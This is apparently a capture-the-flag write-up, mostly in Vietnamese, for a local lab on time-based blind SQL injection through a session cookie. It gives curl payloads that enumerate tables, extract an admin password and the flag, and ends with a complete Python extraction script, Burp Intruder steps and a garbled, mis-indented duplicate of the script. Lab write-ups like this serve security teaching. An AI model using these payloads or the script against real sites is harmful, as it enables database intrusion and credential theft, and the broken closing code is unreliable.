# SQLi-033: MySQL Cookie Time-based - Writeup

## Flag: `FLAG{c00k13_t1m3_bl1nd}`

---

## 🔍 Bước 1: DETECT

**Injection Point:** Cookie `session_id`

```bash
# Normal request - fast response
curl -b "session_id=sess_abc123" http://localhost:5033/

# Test Time-based SQLi trong Cookie
curl -b "session_id=sess_abc123' AND SLEEP(5)-- -" http://localhost:5033/
```

→ Response chậm ~5s = **Cookie SQLi confirmed!**

---

## 🎯 Bước 2: IDENTIFY DATABASE

```bash
# Check database name
curl -b "session_id=x' AND IF(database()='sessiondb',SLEEP(3),0)-- -" http://localhost:5033/
# ~3s delay → database = 'sessiondb'
```

→ Database: **sessiondb**

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

```bash
curl -b "session_id=x' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=3,SLEEP(5),0)-- -" http://localhost:5033/
```

→ ~5s delay → Có **3 bảng**

### 3.2. Lấy tên bảng

**Bảng 1:**

```bash
curl -b "session_id=x' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='§a§',SLEEP(5),0)-- -" http://localhost:5033/
```

**Kết quả:**

- admin_users
- flags
- sessions

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

**Columns của bảng `flags`:**

```bash
curl -b "session_id=x' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 0,1),1,1)='§i§',SLEEP(5),0)-- -" http://localhost:5033/
```

**Kết quả:**

- id
- name
- value

---

## 📤 Bước 5: EXTRACT PASSWORD

```bash
curl -b "session_id=x' AND IF(SUBSTRING((SELECT password FROM admin_users LIMIT 0,1),1,1)='§C§',SLEEP(5),0)-- -" http://localhost:5033/
```

**Credentials:**

- cookie_time : C00k13_T1m3_P@ss!

---

## 🏆 Bước 6: EXFILTRATE FLAG

```bash
curl -b "session_id=x' AND IF(SUBSTRING((SELECT value FROM flags WHERE name='sqli_033'),1,1)='§F§',SLEEP(5),0)-- -" http://localhost:5033/
```

🎉 **FLAG:** `FLAG{c00k13_t1m3_bl1nd}`

---

## 🤖 Exploit Script

```python
import requests
import time

URL = "http://localhost:5033/"
DELAY = 3
THRESHOLD = 2.5

def check(condition):
    start = time.time()
    # Injection in Cookie
    cookie_value = f"x' AND IF({condition},SLEEP({DELAY}),0)-- -"
    try:
        r = requests.get(URL, cookies={"session_id": cookie_value}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

# Extract flag
print("[*] Extracting flag...")
flag_query = "SELECT value FROM flags WHERE name='sqli_033'"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")
```

---

## 🔑 Cookie Injection Key Points

| Aspect          | Details                                        |
| --------------- | ---------------------------------------------- |
| Injection Point | HTTP Cookie header                             |
| Detection       | Set malicious cookie: `curl -b "cookie=value"` |
| Encoding        | Usually no special encoding needed             |
| Same syntax     | MySQL syntax như trong URL parameters          |
| Burp usage      | Edit Cookie in Repeater/Intruder               |

**⚠️ Common Mistake:**

- Cookie value có thể có space → Không cần URL encode trong curl
- Nhưng trong browser/Burp cần encode nếu có ký tự đặc biệt

**Burp Intruder Cookie Injection:**

1. Intercept request
2. Right-click Cookie header → "Send to Intruder"
3. Mark injection point: `session_id=x' AND IF(condition,SLEEP(5),0)§§--`
4. Set payload positions và attack!
   start = time.time()
   cookie = f"sess_abc123' AND IF({cond},SLEEP(2),0)-- -"
   requests.get("http://localhost:5033/", cookies={"session_id": cookie})
   return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
if check(f"SUBSTRING((SELECT value FROM flags LIMIT 1),{pos},1)='{c}'"):
flag += c
print(f"[+] {flag}")
break

```

```
